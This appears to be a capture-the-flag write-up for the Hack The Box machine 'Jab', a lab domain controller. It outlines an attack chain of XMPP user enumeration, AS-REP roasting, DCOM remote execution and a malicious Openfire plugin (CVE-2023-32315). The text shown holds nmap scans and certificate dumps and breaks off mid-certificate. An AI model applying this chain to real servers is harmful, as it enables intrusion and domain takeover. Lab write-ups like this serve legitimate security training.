# HTB - Jab

### TL;DR
This is a Windows Server 2019 machine running as DC in domain `jab.htb`. It is hosting an Ignite Openfire server, a Jabber/XMPP application for instant messaging. You can dump a list of all the server IM users using an XMPP client such ad Pidgin, then launch an "asreproasting" attack on this user list to find out an user for whom Kerberos pre-auth is disabled. Using these credentials, log in again into the IM server and get access to a restricted chat room where more secrets are disclosed. An user shell is gained by means of remote DCOM execution with Impacket. Regading privilege escalation, it is achieved by uploading a malicious plugin in the Openfire administration console.

### KEYWORDS
Ignite Openfire Server, Jabber/XMPP, asreproasting, DCOM execution, MMC20.Application, CVE-2023-32315.

### REFERENCES
https://www.igniterealtime.org/projects/openfire<br>
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups<br>
https://github.com/miko550/CVE-2023-32315<br>
https://www.cvedetails.com/cve/CVE-2023-32315/<br>

### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason

Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-25 05:50 EST
Nmap scan report for 10.10.11.4
Host is up, received user-set (0.12s latency).
Not shown: 64752 closed tcp ports (conn-refused), 745 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5222/tcp  open  xmpp-client      syn-ack
5223/tcp  open  hpvirtgrp        syn-ack
5262/tcp  open  unknown          syn-ack
5263/tcp  open  unknown          syn-ack
5269/tcp  open  xmpp-server      syn-ack
5270/tcp  open  xmp              syn-ack
5275/tcp  open  unknown          syn-ack
5276/tcp  open  unknown          syn-ack
5985/tcp  open  wsman            syn-ack
7070/tcp  open  realserver       syn-ack
7443/tcp  open  oracleas-https   syn-ack
7777/tcp  open  cbt              syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49672/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49763/tcp open  unknown          syn-ack
64570/tcp open  unknown          syn-ack
65477/tcp open  unknown          syn-ack
65484/tcp open  unknown          syn-ack

Nmap done: 1 IP address (1 host up) scanned in 18.19 seconds
```
Looks like a domain controller, enumerate the open ports.
```markdown
> nmap $target -p53,88,135,139,389,445,464,593,636,3268,3269,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9389 -sV -sC -Pn -vv

Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-25 05:53 EST
Nmap scan report for 10.10.11.4
Host is up, received user-set (0.10s latency).
Scanned at 2024-02-25 05:53:49 EST for 92s

PORT     STATE SERVICE             REASON  VERSION
53/tcp   open  domain              syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec        syn-ack Microsoft Windows Kerberos (server time: 2024-02-25 10:54:55Z)
135/tcp  open  msrpc               syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn         syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-25T10:56:15+00:00; +1m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA/domainComponent=jab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f901d6610b289243ca77dec48df221
| SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
| -----BEGIN CERTIFICATE-----
| MIIFvzCCBKegAwIBAgITWQAAAAJSWxt6j5iOJQAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBAMRMwEQYKCZImiZPyLGQBGRYDaHRiMRMwEQYKCZImiZPyLGQBGRYDamFiMRQw
| EgYDVQQDEwtqYWItREMwMS1DQTAeFw0yMzExMDEyMDE2MThaFw0yNDEwMzEyMDE2
| MThaMBcxFTATBgNVBAMTDERDMDEuamFiLmh0YjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBALyhhrIoyeCxIBUfY1mo1AQrYI4nNbsonppA338bO9USvrUw
| TR9/V+3rMU4S/vei+s2FigycUrzpaU749n9rySQ9/34p8gtJhnubmlPQW8lhh6qN
| IjOWix7BSlEhhgW0ClbDYsvlQ/dgXtHsEjxbjTsVidZvYh5nL0fQvT61P0Hm8nkO
| p7RTZD+euaq+O+qF1LwMYgU0yAAGlNEUTz44AVv3BcI9I3bQa0uOMdejzU07hf0d
| x1vbjz/6vwKVvv72UegWd7R6ANtNgoy9cO60IA7cEHshrnzfcQWpcaOhJgxMkHFS
| 2ThIJMvVEmBY1Yu1oqP3qcMA2ijUU8FXhJYgvHECAwEAAaOCAtkwggLVMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFHENgbJKRZdbCWcWTu4RAzn7
| mseRMB8GA1UdIwQYMBaAFMn7KguvyJy7fx00uETxw3ADj7zeMIHCBgNVHR8Egbow
| gbcwgbSggbGgga6GgatsZGFwOi8vL0NOPWphYi1EQzAxLUNBLENOPURDMDEsQ049
| Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
| bmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbkGCCsG
| AQUFBwEBBIGsMIGpMIGmBggrBgEFBQcwAoaBmWxkYXA6Ly8vQ049amFiLURDMDEt
| Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAv
| oB8GCSsGAQQBgjcZAaASBBAWRnnI9GirQq9+bBt8gwIaggxEQzAxLmphYi5odGIw
| DQYJKoZIhvcNAQEFBQADggEBAEwUT144zjzpCYcyp41JW1XTpAHMkw8YNclKebjP
| 699ip5bQjpC0fwpaXKo+iMZSklytnMVzYETvQ/wr1bGhn5DAvXUK4GN4VaKMho5+
| KcsYBaBlAMCZZbB9Z/zX5nGRDw2Qj6rcoaKssQK2ACFTTWYB/4VZjJhuF275SADB
| qeRsu+Hfc1/h73cDybRKj+8jvphAZPS8wdYq853G08RQghdnKhlGCwRY10RN541L
| j97DUyucvHWAqdXMWshe3chacNaWdBaxg3BOeRuMsfEEn8O3G5643+wZbAH+FMGy
| eb2uiaxUOLycSsONAQ6qt4bwEVGmyOJTHbpwTB8YSJBFU0A=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds?       syn-ack
464/tcp  open  kpasswd5?           syn-ack
593/tcp  open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA/domainComponent=jab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f901d6610b289243ca77dec48df221
| SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
| -----BEGIN CERTIFICATE-----
| MIIFvzCCBKegAwIBAgITWQAAAAJSWxt6j5iOJQAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBAMRMwEQYKCZImiZPyLGQBGRYDaHRiMRMwEQYKCZImiZPyLGQBGRYDamFiMRQw
| EgYDVQQDEwtqYWItREMwMS1DQTAeFw0yMzExMDEyMDE2MThaFw0yNDEwMzEyMDE2
| MThaMBcxFTATBgNVBAMTDERDMDEuamFiLmh0YjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBALyhhrIoyeCxIBUfY1mo1AQrYI4nNbsonppA338bO9USvrUw
| TR9/V+3rMU4S/vei+s2FigycUrzpaU749n9rySQ9/34p8gtJhnubmlPQW8lhh6qN
| IjOWix7BSlEhhgW0ClbDYsvlQ/dgXtHsEjxbjTsVidZvYh5nL0fQvT61P0Hm8nkO
| p7RTZD+euaq+O+qF1LwMYgU0yAAGlNEUTz44AVv3BcI9I3bQa0uOMdejzU07hf0d
| x1vbjz/6vwKVvv72UegWd7R6ANtNgoy9cO60IA7cEHshrnzfcQWpcaOhJgxMkHFS
| 2ThIJMvVEmBY1Yu1oqP3qcMA2ijUU8FXhJYgvHECAwEAAaOCAtkwggLVMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFHENgbJKRZdbCWcWTu4RAzn7
| mseRMB8GA1UdIwQYMBaAFMn7KguvyJy7fx00uETxw3ADj7zeMIHCBgNVHR8Egbow
| gbcwgbSggbGgga6GgatsZGFwOi8vL0NOPWphYi1EQzAxLUNBLENOPURDMDEsQ049
| Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
| bmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbkGCCsG
| AQUFBwEBBIGsMIGpMIGmBggrBgEFBQcwAoaBmWxkYXA6Ly8vQ049amFiLURDMDEt
| Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAv
| oB8GCSsGAQQBgjcZAaASBBAWRnnI9GirQq9+bBt8gwIaggxEQzAxLmphYi5odGIw
| DQYJKoZIhvcNAQEFBQADggEBAEwUT144zjzpCYcyp41JW1XTpAHMkw8YNclKebjP
| 699ip5bQjpC0fwpaXKo+iMZSklytnMVzYETvQ/wr1bGhn5DAvXUK4GN4VaKMho5+
| KcsYBaBlAMCZZbB9Z/zX5nGRDw2Qj6rcoaKssQK2ACFTTWYB/4VZjJhuF275SADB
| qeRsu+Hfc1/h73cDybRKj+8jvphAZPS8wdYq853G08RQghdnKhlGCwRY10RN541L
| j97DUyucvHWAqdXMWshe3chacNaWdBaxg3BOeRuMsfEEn8O3G5643+wZbAH+FMGy
| eb2uiaxUOLycSsONAQ6qt4bwEVGmyOJTHbpwTB8YSJBFU0A=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-02-25T10:56:15+00:00; +1m01s from scanner time.
3268/tcp open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA/domainComponent=jab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f901d6610b289243ca77dec48df221
| SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
| -----BEGIN CERTIFICATE-----
| MIIFvzCCBKegAwIBAgITWQAAAAJSWxt6j5iOJQAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBAMRMwEQYKCZImiZPyLGQBGRYDaHRiMRMwEQYKCZImiZPyLGQBGRYDamFiMRQw
| EgYDVQQDEwtqYWItREMwMS1DQTAeFw0yMzExMDEyMDE2MThaFw0yNDEwMzEyMDE2
| MThaMBcxFTATBgNVBAMTDERDMDEuamFiLmh0YjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBALyhhrIoyeCxIBUfY1mo1AQrYI4nNbsonppA338bO9USvrUw
| TR9/V+3rMU4S/vei+s2FigycUrzpaU749n9rySQ9/34p8gtJhnubmlPQW8lhh6qN
| IjOWix7BSlEhhgW0ClbDYsvlQ/dgXtHsEjxbjTsVidZvYh5nL0fQvT61P0Hm8nkO
| p7RTZD+euaq+O+qF1LwMYgU0yAAGlNEUTz44AVv3BcI9I3bQa0uOMdejzU07hf0d
| x1vbjz/6vwKVvv72UegWd7R6ANtNgoy9cO60IA7cEHshrnzfcQWpcaOhJgxMkHFS
| 2ThIJMvVEmBY1Yu1oqP3qcMA2ijUU8FXhJYgvHECAwEAAaOCAtkwggLVMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFHENgbJKRZdbCWcWTu4RAzn7
| mseRMB8GA1UdIwQYMBaAFMn7KguvyJy7fx00uETxw3ADj7zeMIHCBgNVHR8Egbow
| gbcwgbSggbGgga6GgatsZGFwOi8vL0NOPWphYi1EQzAxLUNBLENOPURDMDEsQ049
| Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
| bmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbkGCCsG
| AQUFBwEBBIGsMIGpMIGmBggrBgEFBQcwAoaBmWxkYXA6Ly8vQ049amFiLURDMDEt
| Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAv
| oB8GCSsGAQQBgjcZAaASBBAWRnnI9GirQq9+bBt8gwIaggxEQzAxLmphYi5odGIw
| DQYJKoZIhvcNAQEFBQADggEBAEwUT144zjzpCYcyp41JW1XTpAHMkw8YNclKebjP
| 699ip5bQjpC0fwpaXKo+iMZSklytnMVzYETvQ/wr1bGhn5DAvXUK4GN4VaKMho5+
| KcsYBaBlAMCZZbB9Z/zX5nGRDw2Qj6rcoaKssQK2ACFTTWYB/4VZjJhuF275SADB
| qeRsu+Hfc1/h73cDybRKj+8jvphAZPS8wdYq853G08RQghdnKhlGCwRY10RN541L
| j97DUyucvHWAqdXMWshe3chacNaWdBaxg3BOeRuMsfEEn8O3G5643+wZbAH+FMGy
| eb2uiaxUOLycSsONAQ6qt4bwEVGmyOJTHbpwTB8YSJBFU0A=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-02-25T10:56:16+00:00; +1m02s from scanner time.
3269/tcp open  ssl/ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-25T10:56:15+00:00; +1m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA/domainComponent=jab
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f901d6610b289243ca77dec48df221
| SHA-1: 66eac22be584ab5e07e3aa8f5af2b63407338c06
| -----BEGIN CERTIFICATE-----
| MIIFvzCCBKegAwIBAgITWQAAAAJSWxt6j5iOJQAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBAMRMwEQYKCZImiZPyLGQBGRYDaHRiMRMwEQYKCZImiZPyLGQBGRYDamFiMRQw
| EgYDVQQDEwtqYWItREMwMS1DQTAeFw0yMzExMDEyMDE2MThaFw0yNDEwMzEyMDE2
| MThaMBcxFTATBgNVBAMTDERDMDEuamFiLmh0YjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBALyhhrIoyeCxIBUfY1mo1AQrYI4nNbsonppA338bO9USvrUw
| TR9/V+3rMU4S/vei+s2FigycUrzpaU749n9rySQ9/34p8gtJhnubmlPQW8lhh6qN
| IjOWix7BSlEhhgW0ClbDYsvlQ/dgXtHsEjxbjTsVidZvYh5nL0fQvT61P0Hm8nkO
| p7RTZD+euaq+O+qF1LwMYgU0yAAGlNEUTz44AVv3BcI9I3bQa0uOMdejzU07hf0d
| x1vbjz/6vwKVvv72UegWd7R6ANtNgoy9cO60IA7cEHshrnzfcQWpcaOhJgxMkHFS
| 2ThIJMvVEmBY1Yu1oqP3qcMA2ijUU8FXhJYgvHECAwEAAaOCAtkwggLVMC8GCSsG
| AQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNV
| HSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqG
| SIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
| hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUw
| BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFHENgbJKRZdbCWcWTu4RAzn7
| mseRMB8GA1UdIwQYMBaAFMn7KguvyJy7fx00uETxw3ADj7zeMIHCBgNVHR8Egbow
| gbcwgbSggbGgga6GgatsZGFwOi8vL0NOPWphYi1EQzAxLUNBLENOPURDMDEsQ049
| Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
| bmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25M
| aXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbkGCCsG
| AQUFBwEBBIGsMIGpMIGmBggrBgEFBQcwAoaBmWxkYXA6Ly8vQ049amFiLURDMDEt
| Q0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2Vz
| LENOPUNvbmZpZ3VyYXRpb24sREM9amFiLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAv
| oB8GCSsGAQQBgjcZAaASBBAWRnnI9GirQq9+bBt8gwIaggxEQzAxLmphYi5odGIw
| DQYJKoZIhvcNAQEFBQADggEBAEwUT144zjzpCYcyp41JW1XTpAHMkw8YNclKebjP
| 699ip5bQjpC0fwpaXKo+iMZSklytnMVzYETvQ/wr1bGhn5DAvXUK4GN4VaKMho5+
| KcsYBaBlAMCZZbB9Z/zX5nGRDw2Qj6rcoaKssQK2ACFTTWYB/4VZjJhuF275SADB
| qeRsu+Hfc1/h73cDybRKj+8jvphAZPS8wdYq853G08RQghdnKhlGCwRY10RN541L
| j97DUyucvHWAqdXMWshe3chacNaWdBaxg3BOeRuMsfEEn8O3G5643+wZbAH+FMGy
| eb2uiaxUOLycSsONAQ6qt4bwEVGmyOJTHbpwTB8YSJBFU0A=
|_-----END CERTIFICATE-----
5222/tcp open  jabber              syn-ack Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   331765e1e84a14c29ac454bab51626d8
| SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     unknown: 
|     stream_id: mky66t6lq
|     auth_mechanisms: 
|     features: 
|_    capabilities: 
5223/tcp open  ssl/jabber          syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   331765e1e84a14c29ac454bab51626d8
| SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     xmpp: 
|     auth_mechanisms: 
|     features: 
|_    capabilities: 
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5262/tcp open  jabber              syn-ack Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     unknown: 
|     stream_id: at52jo4g2u
|     auth_mechanisms: 
|     features: 
|_    capabilities: 
5263/tcp open  ssl/jabber          syn-ack Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   331765e1e84a14c29ac454bab51626d8
| SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
